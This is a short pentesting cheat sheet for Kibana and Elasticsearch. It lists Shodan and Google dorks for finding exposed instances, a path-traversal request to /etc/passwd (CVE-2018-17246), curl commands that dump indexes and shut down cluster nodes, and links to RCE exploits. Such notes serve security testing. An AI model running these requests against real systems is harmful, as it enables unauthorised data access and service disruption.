# TOPIC
PENTESTING KIBANA SERVICE

# OVERVIEW
Kibana is a Data visualization tool.
It is an open source data visualization dashboard for Elastic Search.
It provides visualization capabilities on top of the indexed ElasticSearch cluster.
Users can visualize data, by their own needs like
	- pie
	- graph
	- charts

# TESTING KIBANA SERVICE
## CVE
- Since Kibana service is a third party tool, the first thing we must check is for CVEs.
- Check for unathenticated dashboards
- Check for information leak that are sensitive

## SHODAN DORKS
- title:"kibana" port:"443"
- kibana content-length: 217
Kibana would return a conent length of 217, on the presence of an unauthenticated dashboard instance.
Twitter Links : 
```
https://twitter.com/prateek_0490/status/1164564646738530304
https://twitter.com/emenalf/status/1082935342477594624

```

## GOOGLE DORKS
- inurl:app/kibana
- inurl:app/kibana intext:Loading Kibana
- inurl:5601/app/kibana

## Elastic Search Kibana Console LFI (CVE-2018-17246)
- Make a request to the following endpoint : /etc/passwd
> GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
Twitter links :
```
https://twitter.com/IM_23pds/status/1074627634150006784
```

## ElasticSearch CVE-2015-1427 RCE Exploit
WRITE UP LINK :
```
http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html

```


## OTHER TIPS
-  List All indexes
> curl -X GET http://localhost:9200/_cat/indices?v
-  List all docs in index
> curl -X GET http://localhost:9200/<index_name>/_search
> curl -X GET http://localhost:9200/esmapping/_search
-  Shutting Down Nodes 
> curl -X POST http://localhost:9200/_shutdown
> curl -XPOST 'http://localhost:9200/_cluster/nodes/_master/_shutdown

Original Post : https://www.facebook.com/ExWareLabs/posts/elasticsearch-pentest-tip1-list-all-indexescurl-x-get-httplocalhost9200_catindic/2496305100433349/

## CVE-2019-7609
- Proof of Concept: https://github.com/mpgn/CVE-2019-7609

## REFERENCE TIPS ON PENTESTING KIBANA
- https://book.hacktricks.xyz/pentesting/5601-pentesting-kibana
- https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch

## ALREADY KNOWN VULNERABILITIES
- https://www.cybersecurity-help.cz/vdb/SB2020072815
- https://www.cvedetails.com/vulnerability-list/vendor_id-13554/product_id-31867/Elasticsearch-Kibana.html



# REFERNCES AND GOOD READS
a. https://insinuator.net/2021/01/pentesting-the-elk-stack/#kibana
b. https://medium.com/@InfoSecIta/kibana-the-new-toy-for-pentesters-bughunters-hackers-e72048bd98b0
c. https://www.marcolancini.it/2018/blog-elk-for-nmap/
d. https://resources.infosecinstitute.com/topic/learning-pentesting-metasploitable3-exploiting-elasticsearch/
e. https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability

